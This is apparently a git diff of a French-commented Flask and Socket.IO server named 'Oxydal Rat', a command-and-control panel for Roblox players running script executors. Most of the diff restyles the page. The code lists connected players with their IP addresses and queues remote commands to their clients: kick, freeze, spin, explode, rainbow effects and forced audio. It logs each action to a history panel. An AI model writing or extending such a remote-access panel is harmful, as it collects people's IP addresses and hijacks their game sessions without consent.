@@ -4,6 +4,7 @@ import time
 import eventlet
 from datetime import datetime
 
+# Patch pour la gestion de l'asynchrone avec Eventlet
 eventlet.monkey_patch()
 
 app = Flask(__name__)
@@ -18,7 +19,6 @@ pending_commands = {}
 history_logs = [] 
 
 def add_to_history(action, p_data):
-    # p_data contient toutes les infos du joueur pour un historique riche
     log = {
         "id": str(time.time()),
         "time": datetime.now().strftime("%H:%M:%S"),
@@ -43,15 +43,15 @@ HTML = """<!DOCTYPE html>
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<title>Oxydal Rat</title>
+<title>Oxydal Rat - Compact</title>
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
 <style>
     :root {
         --bg: #050505;
-        --card-bg: rgba(20, 20, 25, 0.8);
+        --card-bg: rgba(20, 20, 25, 0.9);
         --accent: #00f2ff;
-        --accent-glow: rgba(0, 242, 255, 0.5);
+        --accent-glow: rgba(0, 242, 255, 0.4);
         --danger: #ff0055;
         --warning: #ffcc00;
     }
@@ -59,124 +59,93 @@ HTML = """<!DOCTYPE html>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body { 
         font-family: 'Rajdhani', sans-serif; 
-        background: var(--bg); 
-        color: #fff; 
-        overflow-x: hidden;
+        background: var(--bg); color: #fff; overflow-x: hidden;
         background-image: radial-gradient(circle at 50% 0%, #102030 0%, #050505 70%);
     }
 
-    /* Animations */
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-    @keyframes pulse { 0% { box-shadow: 0 0 5px var(--accent); } 50% { box-shadow: 0 0 20px var(--accent); } 100% { box-shadow: 0 0 5px var(--accent); } }
+    .container { max-width: 1700px; margin: auto; padding: 20px; animation: fadeIn 0.5s ease-out; }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-    .container { max-width: 1600px; margin: auto; padding: 40px; animation: fadeIn 0.8s ease-out; }
-    
     h1 { 
-        font-family: 'Orbitron'; font-size: 3.5rem; text-align: center; margin-bottom: 50px;
+        font-family: 'Orbitron'; font-size: 2.2rem; text-align: center; margin-bottom: 30px;
         background: linear-gradient(to bottom, #fff, var(--accent));
         -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-        filter: drop-shadow(0 0 15px var(--accent-glow));
+        filter: drop-shadow(0 0 10px var(--accent-glow));
     }
 
-    .main-layout { display: grid; grid-template-columns: 1fr 450px; gap: 40px; }
+    .main-layout { display: grid; grid-template-columns: 1fr 400px; gap: 20px; }
 
-    /* Glassmorphism Cards */
+    /* Grille de joueurs pour permettre plusieurs colonnes si l'écran est large */
+    #players { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 15px; }
+
     .card { 
-        background: var(--card-bg); 
-        border: 1px solid rgba(255, 255, 255, 0.1); 
-        border-radius: 20px; padding: 25px; 
-        backdrop-filter: blur(10px);
-        position: relative; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        background: var(--card-bg); border: 1px solid rgba(255, 255, 255, 0.1); 
+        border-radius: 12px; padding: 15px; backdrop-filter: blur(10px);
+        position: relative; transition: 0.2s;
     }
-    .card:hover { transform: scale(1.02); border-color: var(--accent); box-shadow: 0 10px 30px rgba(0, 242, 255, 0.2); }
+    .card:hover { border-color: var(--accent); box-shadow: 0 5px 15px rgba(0, 242, 255, 0.1); }
 
     .trash-player { 
-        position: absolute; top: 20px; right: 20px; background: none; border: none; 
-        color: #444; cursor: pointer; font-size: 1.4rem; transition: 0.3s; 
+        position: absolute; top: 12px; right: 12px; background: none; border: none; 
+        color: #444; cursor: pointer; font-size: 1.1rem; 
     }
-    .trash-player:hover { color: var(--danger); transform: rotate(15deg); }
+    .trash-player:hover { color: var(--danger); }
 
     .status-badge { 
-        display: inline-flex; align-items: center; padding: 5px 12px; border-radius: 20px; 
-        font-size: 0.8rem; font-weight: bold; background: rgba(0,0,0,0.5); margin-bottom: 15px;
+        display: inline-flex; align-items: center; padding: 3px 8px; border-radius: 10px; 
+        font-size: 0.65rem; font-weight: bold; background: rgba(0,0,0,0.5); margin-bottom: 8px;
     }
-    .dot { width: 8px; height: 8px; border-radius: 50%; margin-right: 8px; }
-    .online { background: var(--accent); animation: pulse 2s infinite; }
+    .dot { width: 6px; height: 6px; border-radius: 50%; margin-right: 5px; }
+    .online { background: var(--accent); box-shadow: 0 0 5px var(--accent); }
 
     .name a { 
-        font-family: 'Orbitron'; font-size: 1.5rem; color: var(--warning); 
-        text-decoration: none; transition: 0.3s; 
+        font-family: 'Orbitron'; font-size: 1.1rem; color: var(--warning); 
+        text-decoration: none; display: block; margin-bottom: 5px;
     }
-    .name a:hover { text-shadow: 0 0 10px var(--warning); }
 
-    .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; font-size: 0.9rem; color: #aaa; }
+    .info-grid { display: grid; grid-template-columns: 1fr; gap: 3px; margin-bottom: 12px; font-size: 0.75rem; color: #aaa; }
     .info-grid b { color: #fff; }
 
-    /* Buttons Style */
-    .btn-group { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 15px; }
+    /* Boutons compacts en 3 colonnes */
+    .btn-group { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-top: 8px; }
     .btn { 
-        padding: 12px; border: none; border-radius: 8px; cursor: pointer; 
-        font-weight: bold; font-family: 'Rajdhani'; font-size: 0.9rem; text-transform: uppercase;
-        color: white; transition: 0.3s; position: relative; overflow: hidden;
+        padding: 6px 2px; border: none; border-radius: 4px; cursor: pointer; 
+        font-weight: bold; font-family: 'Rajdhani'; font-size: 0.65rem; text-transform: uppercase;
+        color: white; transition: 0.2s;
     }
-    .btn::after { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent); transition: 0.5s; }
-    .btn:hover::after { left: 100%; }
     .btn:active { transform: scale(0.95); }
+    .btn-troll { background: #2a2a35; border: 1px solid #444; }
+    .btn-troll:hover { background: var(--accent); color: #000; border-color: var(--accent); }
+    .btn-undo { background: #1a1a1a; color: #666; border: 1px solid #333; }
+    .btn-undo:hover { background: #333; color: #fff; }
 
-    .btn-troll { background: linear-gradient(135deg, #12c2e9, #c471ed, #f64f59); }
-    .btn-undo { background: #222; border: 1px solid #444; }
-    .btn-undo:hover { background: #333; }
-
-    /* History Panel */
-    .history-panel { 
-        background: rgba(10, 10, 15, 0.9); border: 1px solid rgba(255,255,255,0.05); 
-        border-radius: 24px; padding: 25px; height: 800px; display: flex; flex-direction: column; 
-    }
-    .history-list { flex-grow: 1; overflow-y: auto; padding-right: 10px; }
-    .history-list::-webkit-scrollbar { width: 5px; }
-    .history-list::-webkit-scrollbar-thumb { background: var(--accent); border-radius: 10px; }
-
-    .history-item { 
-        padding: 15px; border-bottom: 1px solid rgba(255,255,255,0.05); 
-        font-size: 0.85rem; line-height: 1.5; transition: 0.2s;
-    }
-    .history-item:hover { background: rgba(255,255,255,0.02); }
+    /* Logs */
+    .history-panel { background: rgba(10, 10, 15, 0.9); border-radius: 15px; padding: 15px; height: 750px; }
+    .history-list { overflow-y: auto; height: 100%; font-size: 0.8rem; }
+    .history-item { padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
     .hist-time { color: var(--accent); font-family: monospace; }
-    .hist-main { display: block; margin: 5px 0; font-weight: bold; font-size: 0.95rem; }
-    .hist-details { color: #777; font-size: 0.8rem; display: block; }
-    .hist-details a { color: var(--accent); text-decoration: none; }
 
     /* Modals */
-    .modal { 
-        display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-        background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); z-index: 1000; align-items: center; justify-content: center;
-    }
+    .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center; }
     .modal.active { display: flex; }
-    .modal-content { 
-        background: #111; padding: 40px; border-radius: 24px; border: 1px solid var(--accent); 
-        width: 400px; text-align: center; box-shadow: 0 0 50px rgba(0, 242, 255, 0.2);
-    }
-    .modal-content input { 
-        width: 100%; padding: 15px; background: #1a1a1a; border: 1px solid #333; 
-        color: white; border-radius: 10px; margin: 20px 0; font-family: 'Rajdhani';
-    }
+    .modal-content { background: #111; padding: 25px; border-radius: 15px; border: 1px solid var(--accent); width: 320px; text-align: center; }
+    .modal-content input { width: 100%; padding: 10px; background: #1a1a1a; border: 1px solid #333; color: white; margin: 15px 0; }
 </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>Oxydal Rat</h1>
+    <h1>OXYDAL CONTROL</h1>
     
     <div class="main-layout">
         <section>
-            <h2 style="color: var(--accent); margin-bottom: 25px; font-family: 'Orbitron'; font-size: 1rem; letter-spacing: 2px;">Players</h2>
-            <div class="grid" id="players"></div>
+            <div id="players"></div>
         </section>
 
         <aside>
-            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 25px;">
-                <h2 style="color: var(--accent); font-family: 'Orbitron'; font-size: 1rem; letter-spacing: 2px;">Logs</h2>
-                <button onclick="clearHistory()" style="background:none; border:none; color: var(--danger); cursor:pointer; font-weight:bold; font-size:0.7rem;">[ CLEAR ]</button>
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 15px;">
+                <h2 style="color: var(--accent); font-family: 'Orbitron'; font-size: 0.9rem;">LOGS SYSTEM</h2>
+                <button onclick="clearHistory()" style="background:none; border:none; color: var(--danger); cursor:pointer; font-size:0.7rem;">[ CLEAR ]</button>
             </div>
             <div class="history-panel">
                 <div class="history-list" id="history-list"></div>
@@ -187,8 +156,8 @@ HTML = """<!DOCTYPE html>
 
 <div class="modal" id="kickModal">
     <div class="modal-content">
-        <h2 style="color:var(--danger)">TERMINATE SESSION</h2>
-        <input type="text" id="kickReason" placeholder="Reason for termination...">
+        <h3 style="color:var(--danger)">KICK PLAYER</h3>
+        <input type="text" id="kickReason" placeholder="Reason...">
         <div style="display:flex; gap:10px">
             <button class="btn" style="flex:1; background:#333" onclick="closeModal('kickModal')">Abort</button>
             <button class="btn" style="flex:1; background:var(--danger)" id="confirmKickBtn">Confirm</button>
@@ -198,11 +167,11 @@ HTML = """<!DOCTYPE html>
 
 <div class="modal" id="soundModal">
     <div class="modal-content">
-        <h2 style="color:var(--accent)">BROADCAST AUDIO</h2>
-        <input type="text" id="soundAssetId" placeholder="Audio Asset ID">
+        <h3 style="color:var(--accent)">PLAY AUDIO</h3>
+        <input type="text" id="soundAssetId" placeholder="Asset ID">
         <div style="display:flex; gap:10px">
             <button class="btn" style="flex:1; background:#333" onclick="closeModal('soundModal')">Abort</button>
-            <button class="btn" style="flex:1; background:var(--accent)" id="confirmSoundBtn">Transmit</button>
+            <button class="btn" style="flex:1; background:var(--accent)" id="confirmSoundBtn">Play</button>
         </div>
     </div>
 </div>
@@ -224,7 +193,7 @@ function clearHistory() { fetch("/clear_history", {method: "POST"}); }
 function deleteLog(id) { fetch("/clear_history", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({log_id: id})}); }
 
 document.getElementById('confirmKickBtn').onclick = () => {
-    sendTroll(selectedUid, 'kick', document.getElementById('kickReason').value || "Terminated by Admin");
+    sendTroll(selectedUid, 'kick', document.getElementById('kickReason').value || "Terminated");
     closeModal('kickModal');
 };
 document.getElementById('confirmSoundBtn').onclick = () => {
@@ -242,33 +211,27 @@ socket.on("update", (data) => {
             card = document.createElement("div"); card.className = "card"; card.id = `card_${id}`; grid.appendChild(card);
         }
         card.innerHTML = `
-            <button class="trash-player" onclick="deletePlayer('${id}')">🗑</button>
-            <div class="status-badge"><div class="dot ${p.online ? 'online' : ''}"></div>${p.online ? 'ACTIVE' : 'IDLE'}</div>
+            <button class="trash-player" onclick="deletePlayer('${id}')">×</button>
+            <div class="status-badge"><div class="dot ${p.online ? 'online' : ''}"></div>${p.online ? 'LIVE' : 'IDLE'}</div>
             <div class="name"><a href="https://www.roblox.com/fr/users/${id}/profile" target="_blank">${p.username}</a></div>
             
             <div class="info-grid">
-                <div><b>IP:</b> ${p.ip}</div>
-                <div><b>Executor:</b> ${p.executor}</div>
-                <div style="grid-column: span 2"><b>Game:</b> <a href="https://www.roblox.com/fr/games/${p.gameId}" target="_blank">${p.gameName}</a></div>
+                <div><b>IP:</b> ${p.ip} | <b>Exec:</b> ${p.executor}</div>
+                <div><b>Game:</b> <a href="https://www.roblox.com/fr/games/${p.gameId}" target="_blank" style="color:#777; text-decoration:none">${p.gameName}</a></div>
             </div>
 
-            <div style="color:var(--accent); font-size:0.7rem; letter-spacing:1px; margin-bottom:10px">Troll</div>
             <div class="btn-group">
                 <button class="btn btn-troll" onclick="openKickModal('${id}')">KICK</button>
                 <button class="btn btn-troll" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                 <button class="btn btn-troll" onclick="sendTroll('${id}','spin')">SPIN</button>
-                <button class="btn btn-troll" onclick="sendTroll('${id}','explode')">EXPLODE</button>
-                <button class="btn btn-troll" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
-                <button class="btn btn-troll" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
-                <button class="btn btn-troll" style="grid-column: span 2; background:orange" onclick="openSoundModal('${id}')">PLAY AUDIO</button>
+                <button class="btn btn-troll" onclick="sendTroll('${id}','explode')">BOOM</button>
+                <button class="btn btn-troll" onclick="sendTroll('${id}','rainbow')">RGB</button>
+                <button class="btn btn-troll" style="background:#8a2be2; border:none" onclick="openSoundModal('${id}')">AUDIO</button>
             </div>
-
-            <div style="color:#555; font-size:0.7rem; letter-spacing:1px; margin:15px 0 10px">UNDO</div>
             <div class="btn-group">
-                <button class="btn btn-undo" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
-                <button class="btn btn-undo" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
-                <button class="btn btn-undo" onclick="sendTroll('${id}','stopsound')">STOPSOUND</button>
-                <button class="btn btn-undo" onclick="sendTroll('${id}','unrainbow')">UNRAINBOW</button>
+                <button class="btn btn-undo" onclick="sendTroll('${id}','unfreeze')">THAW</button>
+                <button class="btn btn-undo" onclick="sendTroll('${id}','unspin')">STOP</button>
+                <button class="btn btn-undo" onclick="sendTroll('${id}','stopsound')">MUTE</button>
             </div>
         `;
     });
@@ -279,15 +242,8 @@ socket.on("update_history", (logs) => {
     const list = document.getElementById("history-list");
     list.innerHTML = logs.map(log => `
         <div class="history-item">
-            <div style="display:flex; justify-content:space-between">
-                <span class="hist-time">[${log.time}]</span>
-                <span onclick="deleteLog('${log.id}')" style="cursor:pointer; color:#444">✕</span>
-            </div>
-            <span class="hist-main">${log.user} <span style="color:#555">(${log.ip})</span></span>
-            <span class="hist-details">
-                Action: <b style="color:var(--accent)">${log.action.toUpperCase()}</b><br>
-                Game: <a href="https://www.roblox.com/fr/games/${log.gameId}" target="_blank">${log.gameName}</a> | Exec: ${log.executor}
-            </span>
+            <span class="hist-time">[${log.time}]</span> <b>${log.user}</b> <br>
+            <span style="color:#555">${log.action}</span>
         </div>
     `).join('');
 });
@@ -311,13 +267,12 @@ def api():
         d = request.get_json(silent=True) or {}
         uid = str(d.get("userid", ""))
         if d.get("action") == "register" and uid:
-            d["userid"] = uid
             if uid not in connected_players:
                 add_to_history("Connexion", d)
             connected_players[uid] = {
                 "username": d.get("username", "Unknown"),
                 "ip": d.get("ip", "Unknown"),
-                "gameName": d.get("gameName", "Click to view"),
+                "gameName": d.get("gameName", "N/A"),
                 "gameId": d.get("gameId", "0"),
                 "executor": d.get("executor", "Unknown"),
                 "last": now, "online": True
@@ -339,7 +294,6 @@ def troll():
     uid, cmd = str(d["userid"]), d["cmd"]
     assetId = d.get("assetId")
     pending_commands[uid] = {"command": cmd, "assetId": assetId} if assetId else {"command": cmd}
-    
     p_data = connected_players.get(uid, {"username": "Unknown"})
     add_to_history(f"Cmd: {cmd}", p_data)
     return jsonify({"sent": True})
@@ -349,7 +303,7 @@ def delete_player():
     check_ip()
     uid = str(request.get_json()["userid"])
     if uid in connected_players:
-        add_to_history("Panel: Delete", connected_players[uid])
+        add_to_history("Supprimé du panel", connected_players[uid])
         del connected_players[uid]
     return jsonify({"ok": True})
 
@@ -373,14 +327,12 @@ def broadcast_loop():
             p["online"] = (now - p["last"] < 15)
             if now - p["last"] > 60: to_remove.append(uid)
         for uid in to_remove:
-            add_to_history("Déconnexion (Timeout)", connected_players[uid])
-            del connected_players[uid]
+            if uid in connected_players:
+                add_to_history("Déconnexion (Timeout)", connected_players[uid])
+                del connected_players[uid]
         socketio.emit("update", {"players": connected_players})
         socketio.sleep(2)
 
 if __name__ == "__main__":
     socketio.start_background_task(broadcast_loop)
     socketio.run(app, host="0.0.0.0", port=5000)
-
-
-
